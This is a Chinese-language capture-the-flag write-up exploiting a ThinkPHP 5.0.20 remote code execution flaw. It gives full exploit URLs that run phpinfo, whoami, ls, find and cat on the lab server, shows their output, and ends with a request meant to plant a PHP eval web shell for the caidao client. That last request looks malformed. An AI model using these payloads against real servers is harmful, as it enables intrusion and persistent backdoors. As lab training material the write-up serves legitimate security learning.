本题是ThinkPHP版本5的漏洞，
输入 http://220.249.52.133:49352/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
可执行phpinfo。
在最底下发现PHP版本号：
 ThinkPHP V5.0.20 { 十年磨一剑-为API开发设计的高性能框架 } 

可执行命令：
输入http://220.249.52.133:49352/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
返回www-data www-data

因此可以在目录中进行查找：
输入http://220.249.52.133:49352/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls ../../
可查看上级目录下的文件列表
显示：backups cache lib local lock log mail opt run spool tmp www www

经过逐级查看文件列表，找出flag文件：
输入http://220.249.52.133:49352/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat ../../../flag
flag{thinkphp5_rce} flag{thinkphp5_rce}

也可以进行查找：
输入http://220.249.52.133:49352/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find / -name "*flag*"
显示：
/proc/sys/kernel/acpi_video_flags /proc/sys/kernel/sched_domain/cpu0/domain0/flags /proc/sys/kernel/sched_domain/cpu0/domain1/flags /proc/sys/kernel/sched_domain/cpu1/domain0/flags /proc/sys/kernel/sched_domain/cpu1/domain1/flags /proc/sys/kernel/sched_domain/cpu10/domain0/flags /proc/sys/kernel/sched_domain/cpu10/domain1/flags /proc/sys/kernel/sched_domain/cpu11/domain0/flags /proc/sys/kernel/sched_domain/cpu11/domain1/flags /proc/sys/kernel/sched_domain/cpu12/domain0/flags /proc/sys/kernel/sched_domain/cpu12/domain1/flags /proc/sys/kernel/sched_domain/cpu13/domain0/flags /proc/sys/kernel/sched_domain/cpu13/domain1/flags /proc/sys/kernel/sched_domain/cpu14/domain0/flags /proc/sys/kernel/sched_domain/cpu14/domain1/flags /proc/sys/kernel/sched_domain/cpu15/domain0/flags /proc/sys/kernel/sched_domain/cpu15/domain1/flags /proc/sys/kernel/sched_domain/cpu16/domain0/flags /proc/sys/kernel/sched_domain/cpu16/domain1/flags /proc/sys/kernel/sched_domain/cpu17/domain0/flags /proc/sys/kernel/sched_domain/cpu17/domain1/flags /proc/sys/kernel/sched_domain/cpu18/domain0/flags /proc/sys/kernel/sched_domain/cpu18/domain1/flags /proc/sys/kernel/sched_domain/cpu19/domain0/flags /proc/sys/kernel/sched_domain/cpu19/domain1/flags /proc/sys/kernel/sched_domain/cpu2/domain0/flags /proc/sys/kernel/sched_domain/cpu2/domain1/flags /proc/sys/kernel/sched_domain/cpu20/domain0/flags /proc/sys/kernel/sched_domain/cpu20/domain1/flags /proc/sys/kernel/sched_domain/cpu21/domain0/flags /proc/sys/kernel/sched_domain/cpu21/domain1/flags /proc/sys/kernel/sched_domain/cpu22/domain0/flags /proc/sys/kernel/sched_domain/cpu22/domain1/flags /proc/sys/kernel/sched_domain/cpu23/domain0/flags /proc/sys/kernel/sched_domain/cpu23/domain1/flags /proc/sys/kernel/sched_domain/cpu24/domain0/flags /proc/sys/kernel/sched_domain/cpu24/domain1/flags /proc/sys/kernel/sched_domain/cpu25/domain0/flags /proc/sys/kernel/sched_domain/cpu25/domain1/flags /proc/sys/kernel/sched_domain/cpu26/domain0/flags /proc/sys/kernel/sched_domain/cpu26/domain1/flags /proc/sys/kernel/sched_domain/cpu27/domain0/flags /proc/sys/kernel/sched_domain/cpu27/domain1/flags /proc/sys/kernel/sched_domain/cpu28/domain0/flags /proc/sys/kernel/sched_domain/cpu28/domain1/flags /proc/sys/kernel/sched_domain/cpu29/domain0/flags /proc/sys/kernel/sched_domain/cpu29/domain1/flags /proc/sys/kernel/sched_domain/cpu3/domain0/flags /proc/sys/kernel/sched_domain/cpu3/domain1/flags /proc/sys/kernel/sched_domain/cpu30/domain0/flags /proc/sys/kernel/sched_domain/cpu30/domain1/flags /proc/sys/kernel/sched_domain/cpu31/domain0/flags /proc/sys/kernel/sched_domain/cpu31/domain1/flags /proc/sys/kernel/sched_domain/cpu32/domain0/flags /proc/sys/kernel/sched_domain/cpu32/domain1/flags /proc/sys/kernel/sched_domain/cpu33/domain0/flags /proc/sys/kernel/sched_domain/cpu33/domain1/flags /proc/sys/kernel/sched_domain/cpu34/domain0/flags /proc/sys/kernel/sched_domain/cpu34/domain1/flags /proc/sys/kernel/sched_domain/cpu35/domain0/flags /proc/sys/kernel/sched_domain/cpu35/domain1/flags /proc/sys/kernel/sched_domain/cpu4/domain0/flags /proc/sys/kernel/sched_domain/cpu4/domain1/flags /proc/sys/kernel/sched_domain/cpu5/domain0/flags /proc/sys/kernel/sched_domain/cpu5/domain1/flags /proc/sys/kernel/sched_domain/cpu6/domain0/flags /proc/sys/kernel/sched_domain/cpu6/domain1/flags /proc/sys/kernel/sched_domain/cpu7/domain0/flags /proc/sys/kernel/sched_domain/cpu7/domain1/flags /proc/sys/kernel/sched_domain/cpu8/domain0/flags /proc/sys/kernel/sched_domain/cpu8/domain1/flags /proc/sys/kernel/sched_domain/cpu9/domain0/flags /proc/sys/kernel/sched_domain/cpu9/domain1/flags /proc/kpageflags /sys/devices/virtual/net/eth0/flags /sys/devices/virtual/net/lo/flags /sys/devices/platform/serial8250/tty/ttyS0/flags /sys/devices/platform/serial8250/tty/ttyS1/flags /sys/devices/platform/serial8250/tty/ttyS2/flags /sys/devices/platform/serial8250/tty/ttyS3/flags /sys/devices/platform/serial8250/tty/ttyS4/flags /sys/devices/platform/serial8250/tty/ttyS5/flags /sys/devices/platform/serial8250/tty/ttyS6/flags /sys/devices/platform/serial8250/tty/ttyS7/flags /sys/devices/platform/serial8250/tty/ttyS8/flags /sys/devices/platform/serial8250/tty/ttyS9/flags /sys/devices/platform/serial8250/tty/ttyS10/flags /sys/devices/platform/serial8250/tty/ttyS11/flags /sys/devices/platform/serial8250/tty/ttyS12/flags /sys/devices/platform/serial8250/tty/ttyS13/flags /sys/devices/platform/serial8250/tty/ttyS14/flags /sys/devices/platform/serial8250/tty/ttyS15/flags /sys/devices/platform/serial8250/tty/ttyS16/flags /sys/devices/platform/serial8250/tty/ttyS17/flags /sys/devices/platform/serial8250/tty/ttyS18/flags /sys/devices/platform/serial8250/tty/ttyS19/flags /sys/devices/platform/serial8250/tty/ttyS20/flags /sys/devices/platform/serial8250/tty/ttyS21/flags /sys/devices/platform/serial8250/tty/ttyS22/flags /sys/devices/platform/serial8250/tty/ttyS23/flags /sys/devices/platform/serial8250/tty/ttyS24/flags /sys/devices/platform/serial8250/tty/ttyS25/flags /sys/devices/platform/serial8250/tty/ttyS26/flags /sys/devices/platform/serial8250/tty/ttyS27/flags /sys/devices/platform/serial8250/tty/ttyS28/flags /sys/devices/platform/serial8250/tty/ttyS29/flags /sys/devices/platform/serial8250/tty/ttyS30/flags /sys/devices/platform/serial8250/tty/ttyS31/flags /sys/module/scsi_mod/parameters/default_dev_flags /usr/lib/x86_64-linux-gnu/perl/5.24.1/bits/waitflags.ph /usr/share/dpkg/buildflags.mk /usr/local/lib/php/build/ax_check_compile_flag.m4 /usr/include/x86_64-linux-gnu/asm/processor-flags.h /usr/include/x86_64-linux-gnu/bits/waitflags.h /usr/include/linux/tty_flags.h /usr/include/linux/kernel-page-flags.h /usr/bin/dpkg-buildflags /flag /flag

再根据目录找出flag：
输入http://220.249.52.133:49352/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag
flag{thinkphp5_rce} flag{thinkphp5_rce}

也可以写入一句话木马：
输入http://220.249.52.133:49352/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=test.php&vars[1][]=<?php highlight_file(__FILE__);@eval($_POST[sss]);?>
如果成功再用菜刀连接。

